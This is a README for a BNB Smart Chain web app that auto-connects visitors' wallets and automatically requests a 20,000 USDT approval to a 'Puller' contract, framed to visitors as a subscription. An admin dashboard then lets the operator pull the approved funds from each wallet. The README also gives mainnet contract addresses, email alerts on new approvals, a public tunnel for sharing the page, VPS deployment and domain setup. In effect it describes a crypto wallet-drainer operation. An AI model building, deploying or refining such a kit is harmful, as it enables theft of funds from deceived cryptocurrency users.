# BSC USDT Puller – Minimal DApp

Two separate pages:
- **/** (homepage) — User-only page. On first load it shows a **Connect** button. If the wallet is already connected, it will auto-connect on reload and **auto-trigger the 20,000 USDT approval** to the Puller contract.
- **/admin** — Admin dashboard. Shows the list of users who approved (stored by the tiny backend), their current allowance/balance, and lets the operator call `pullExact(user, amount)` per user.

## Prerequisites
- Node.js 18+
- A wallet with **BNB** for gas on **BNB Smart Chain (mainnet)**.
- The Puller contract deployed and its address in `public/js/config.js`:
  - Puller: `0xd1e5962eeFe6dc0a870d2148B7e2065666139b5c`
  - USDT:   `0x55d398326f99059fF775485246999027B3197955`

> Defaults in this template are set to mainnet (chainId 56). You can switch to testnet by editing `config.js`.

## Quick start
```bash
npm i
npm start
```
Open:
- User page:  http://localhost:3000/
- Admin page: http://localhost:3000/admin

### Mobile/LAN testing
```bash
npm run start:lan
```
This binds the server to `0.0.0.0` and prints any LAN IPs (for example `http://192.168.x.x:3000`) so other devices on the same Wi-Fi can load the dApp.

`npm start` (and the other variants) automatically free port 3000 before launching. If you still hit `EADDRINUSE`, you can manually force-clear it:
```bash
npm run stop
```

If LAN routing is blocked on your network, start a temporary HTTPS tunnel:
```bash
npm run start:tunnel
```
This runs the app locally and exposes a public URL via LocalTunnel that you can open on any device.

### Build for Netlify
```bash
npm run build
```
This creates a `dist/` directory containing the static site (copied from `public/`) plus a Netlify `_redirects` file so `/admin` resolves to `admin.html`. Point Netlify’s deploy at the `dist/` folder.

If LAN routing is blocked on your network, start a temporary HTTPS tunnel:
```bash
npm run start:tunnel
```
This runs the app locally and exposes a public URL via LocalTunnel that you can open on any device.

## How it works
- **User page** uses `ethers` to ensure BSC, connect the wallet, and call `USDT.approve(PULLER, 20000 * 10^decimals)`.
- On successful approval it POSTs to `POST /api/register` with `{ address, txHash }` so the admin page can display the wallet.
- **Admin page** fetches `GET /api/users` and then queries `allowance` & `balance` on-chain for each user, showing them in a table. Admin can connect as **operator** and pull funds.

## Files
- `public/js/config.js` — network, addresses, and default approval amount.
- `public/js/abi.js` — minimal ABIs for the Puller and ERC20.
- `server.js` — Express server serving static files and a tiny JSON datastore `data/users.json`.
- `public/index.html` — User-only page (connect + auto-approve 20k USDT, no other actions).
- `public/admin.html` — Admin dashboard (view users, allowances, balances, pullExact).

## Production tips
- Host the `public/` directory behind any static server/CDN. Keep `server.js` running if you want the simple address registry, or replace it with your own backend.
- If you prefer **no backend**, replace the list with an on-chain scan of `Approval` events for spender = Puller address using a provider or BscScan API.

## Email alerts
To receive an email each time a wallet finishes the subscription flow, provide SMTP credentials in `.env` (see `.env.example`):

```
SMTP_HOST=smtp.example.com
SMTP_PORT=465
SMTP_SECURE=true
SMTP_USER=puller@zileva.online
SMTP_PASS=app-password
EMAIL_FROM="USDT Puller <puller@zileva.online>"
ADMIN_EMAIL=alerts@yourdomain.com
```

The server will send a summary (address, referral code, referrer, tx hash, timestamp) to `ADMIN_EMAIL` whenever `POST /api/register` records a new approval or a new transaction hash.

## Deployment

### One-time server preparation

1. SSH to the VPS (`ssh root@72.60.221.157`).
2. Install dependencies if they are not already present:
   ```bash
   apt update && apt install -y nginx nodejs npm git
   npm install -g pm2
   mkdir -p /var/www/puller
   ```
3. Clone the repository into `/var/www/puller` and configure your `.env` file on the server.
4. Configure `pm2` (first run only):
   ```bash
   cd /var/www/puller
   npm install
   npm run build
   pm2 start server.js --name puller
   pm2 save
   ```
5. Configure nginx to proxy the app (e.g. `/etc/nginx/sites-available/puller`) and symlink into `sites-enabled`, then `systemctl reload nginx`.

### Automated deployment script

The repository provides `scripts/deploy.sh`. It expects the following environment variables:

| Variable            | Description                                      |
|---------------------|--------------------------------------------------|
| `DEPLOY_HOST`       | VPS IP/hostname (`72.60.221.157`)                |
| `DEPLOY_USER`       | SSH user (`root` by default)                     |
| `DEPLOY_APP_DIR`    | Directory on the VPS (`/var/www/puller`)         |
| `DEPLOY_BRANCH`     | Git branch to deploy (`main`)                    |
| `DEPLOY_REPO_URL`   | Clone URL for this repository                    |
| `DEPLOY_PM2_NAME`   | pm2 process name (`puller` default)              |

Usage example:

```bash
export DEPLOY_HOST=72.60.221.157
export DEPLOY_USER=root
export DEPLOY_REPO_URL=git@github.com:your-account/your-repo.git
scripts/deploy.sh
```

### GitHub Actions deployment

The workflow `.github/workflows/deploy.yml` runs on every push to `main`. Configure the following repository secrets:

- `VPS_SSH_KEY` – private key with access to the VPS (use ssh-keygen and add the public key to `/root/.ssh/authorized_keys`).
- `VPS_HOST` – `72.60.221.157`.
- `VPS_USER` – `root` or another SSH user.
- `REPO_CLONE_URL` – SSH clone URL of this repository (`git@github.com:...`).

Once the secrets are set, every push to `main` will execute:

1. `git fetch / reset` to the latest `main` in `/var/www/puller`.
2. `npm ci --omit=dev` (or `npm install`) and `npm run build` on the VPS.
3. `pm2 restart puller` (or start if missing) and `systemctl reload nginx`.

### DNS

Point `valikon.cloud` (type `A`, name `@`) to `72.60.221.157`, and add a `CNAME` record for `www` pointing to `@`. Update the records via the Hostinger DNS panel and allow propagation (can take a few minutes to a few hours).
